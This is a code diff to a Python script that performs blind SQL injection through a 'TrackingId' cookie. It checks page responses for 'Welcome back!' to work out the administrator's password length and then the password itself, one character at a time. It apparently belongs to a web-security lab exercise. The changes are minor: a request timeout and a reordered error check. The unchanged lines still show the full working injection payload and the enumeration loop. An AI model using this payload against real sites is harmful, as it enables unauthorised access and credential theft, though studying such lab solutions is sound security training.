@@ -5,6 +5,7 @@ import sys
 from requests.adapters import HTTPAdapter, Retry
 
 
+
 def search_text(response):
     soup = BeautifulSoup(response.text, "html.parser")
     return "Welcome back!" in soup.text
@@ -29,7 +30,7 @@ def enumerate_password(url, session, password_length):
     for i in range(1, password_length + 1):
         for j in alphanumeric_characters:
             payload = f"ABC' OR (select username from users where username='administrator' AND SUBSTRING(password,{i},1)='{j}')='administrator"
-            response = session.get(url, cookies={"TrackingId": payload})
+            response = session.get(url, cookies={"TrackingId": payload}, timeout=10)
             if search_text(response):
                 password += j
                 print("\r" + password, end="", flush=True)
@@ -51,11 +52,11 @@ def main():
 
         print("(+) Enumerating Password Length...")
         password_length = enumerate_password_length(url, session)
-        if password_length:
-            print(f"(+) Password Length: {password_length} characters ")
-        else:
+        if not password_length:
             print("(-) Something went wrong. Please check your URL and try again.")
             sys.exit(1)
+
+        print(f"(+) Password Length: {password_length} characters ")
         enumerate_password(url, session, password_length)
         print()
 
